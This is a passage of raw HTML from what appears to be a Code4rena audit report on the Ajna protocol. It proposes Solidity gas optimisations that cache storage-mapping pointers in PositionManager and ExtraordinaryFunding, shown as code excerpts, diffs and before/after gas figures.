13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cache storage pointer for <code>positions[params_.tokenId]</code></h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"161\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PositionManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">190</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">Position</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">position</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">index</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">191</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">192</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// check for previous deposits</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">193</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">194</span><span class=\"mtk1\">:                </span><span class=\"mtk3\">// check that bucket didn&#39;t go bankrupt after prior memorialization</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">195</span><span class=\"mtk1\">:                </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">_bucketBankruptAfterDeposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">, </span><span class=\"mtk12\">index</span><span class=\"mtk1\">, </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">196</span><span class=\"mtk1\">:                    </span><span class=\"mtk3\">// if bucket did go bankrupt, zero out the LP tracked by position manager</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">197</span><span class=\"mtk1\">:                    </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lps</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">198</span><span class=\"mtk1\">:                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">199</span><span class=\"mtk1\">:            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">200</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">201</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// update token position LP</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">202</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lps</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">lpBalance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">203</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// set token&#39;s position deposit time to the original lender&#39;s deposit time</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">204</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">205</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">206</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// save position in storage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">207</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">index</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">position</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"162\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PositionManager.sol b/src/PositionManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 261fbc1..08e09a9 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PositionManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PositionManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -177,7 +177,8 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 indexesLength = params_.indexes.length;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 index;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        mapping(uint256 =&gt; Position) storage _position = positions[params_.tokenId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         for (uint256 i = 0; i &lt; indexesLength; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             index = params_.indexes[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -186,8 +187,8 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             positionIndex.add(index);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             (uint256 lpBalance, uint256 depositTime) = pool.lenderInfo(index, owner);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            Position memory position = positions[params_.tokenId][index];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            Position memory position = _position[index];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // check for previous deposits</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             if (position.depositTime != 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -204,7 +205,7 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             position.depositTime = depositTime;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // save position in storage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            positions[params_.tokenId][index] = position;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            _position[index] = position;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             unchecked { ++i; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L367-L380\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L367-L380</a></p>\n<p><em>Gas Savings for <code>PositionManager.reedemPositions</code>, obtained via protocol’s tests: Avg 167 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>139811</td>\n</tr>\n<tr>\n<td>After</td>\n<td>139644</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"cache-storage-pointer-for-positionsparams_tokenid-1\" style=\"position:relative;\"><a href=\"#cache-storage-pointer-for-positionsparams_tokenid-1\" aria-label=\"cache storage pointer for positionsparams_tokenid 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cache storage pointer for <code>positions[params_.tokenId]</code></h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"163\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PositionManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">367</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">Position</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">position</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">index</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">368</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">369</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lps</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RemovePositionFailed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">370</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">371</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// check that bucket didn&#39;t go bankrupt after memorialization</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">372</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">_bucketBankruptAfterDeposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">, </span><span class=\"mtk12\">index</span><span class=\"mtk1\">, </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">BucketBankrupt</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">373</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">374</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// remove bucket index at which a position has added liquidity</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">375</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">positionIndex</span><span class=\"mtk1\">.</span><span class=\"mtk11\">remove</span><span class=\"mtk1\">(</span><span class=\"mtk12\">index</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RemovePositionFailed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">376</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">377</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">lpAmounts</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lps</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">378</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">379</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// remove LP tracked by position manager at bucket index</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">380</span><span class=\"mtk1\">:            </span><span class=\"mtk4\">delete</span><span class=\"mtk1\"> </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">index</span><span class=\"mtk1\">];</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"164\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PositionManager.sol b/src/PositionManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 261fbc1..09f3417 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PositionManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PositionManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -360,11 +360,12 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256[] memory lpAmounts = new uint256[](indexesLength);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 index;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        mapping(uint256 =&gt; Position) storage _position = positions[params_.tokenId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         for (uint256 i = 0; i &lt; indexesLength; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             index = params_.indexes[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            Position memory position = positions[params_.tokenId][index];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            Position memory position = _position[index];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             if (position.depositTime == 0 || position.lps == 0) revert RemovePositionFailed();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -377,7 +378,7 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             lpAmounts[i] = position.lps;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // remove LP tracked by position manager at bucket index</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            delete positions[params_.tokenId][index];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            delete _position[index];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             unchecked { ++i; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L135-L148\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L135-L148</a></p>\n<p><em>Gas Savings for <code>GrantFund.voteExtraordinary</code>, obtained via protocol’s tests: Avg 67 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>31424</td>\n</tr>\n<tr>\n<td>After</td>\n<td>31357</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"cache-storage-pointer-for-hashvotedextraordinaryproposalid_\" style=\"position:relative;\"><a href=\"#cache-storage-pointer-for-hashvotedextraordinaryproposalid_\" aria-label=\"cache storage pointer for hashvotedextraordinaryproposalid_ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cache storage pointer for <code>hashVotedExtraordinary[proposalId_]</code></h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"165\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ExtraordinaryFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">135</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">hasVotedExtraordinary</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">]) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AlreadyVoted</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">136</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">137</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">ExtraordinaryFundingProposal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_extraordinaryFundingProposals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">138</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// revert if proposal is inactive</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">139</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">startBlock</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">endBlock</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">executed</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">140</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ExtraordinaryFundingProposalInactive</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">141</span><span class=\"mtk1\">:        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">142</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">143</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// check voting power at snapshot block and update proposal votes</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">144</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">votesCast_</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getVotesExtraordinary</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">145</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">votesReceived</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">SafeCast</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toUint120</span><span class=\"mtk1\">(</span><span class=\"mtk12\">votesCast_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">146</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">147</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// record that voter has voted on this extraordinary funding proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">148</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">hasVotedExtraordinary</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"166\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/grants/base/ExtraordinaryFunding.sol b/src/grants/base/ExtraordinaryFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 4a70abb..e128c97 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/grants/base/ExtraordinaryFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/grants/base/ExtraordinaryFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -132,7 +132,8 @@ abstract contract ExtraordinaryFunding is Funding, IExtraordinaryFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 proposalId_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) external override returns (uint256 votesCast_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // revert if msg.sender already voted on proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (hasVotedExtraordinary[proposalId_][msg.sender]) revert AlreadyVoted();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        mapping(address =&gt; bool) storage _hasVoted = hasVotedExtraordinary[proposalId_];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (_hasVoted[msg.sender]) revert AlreadyVoted();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         ExtraordinaryFundingProposal storage proposal = _extraordinaryFundingProposals[proposalId_];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // revert if proposal is inactive</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -145,7 +146,7 @@ abstract contract ExtraordinaryFunding is Funding, IExtraordinaryFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         proposal.votesReceived += SafeCast.toUint120(votesCast_);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // record that voter has voted on this extraordinary funding proposal</span></span></span>\n<span class=\"grvsc-line\"><span 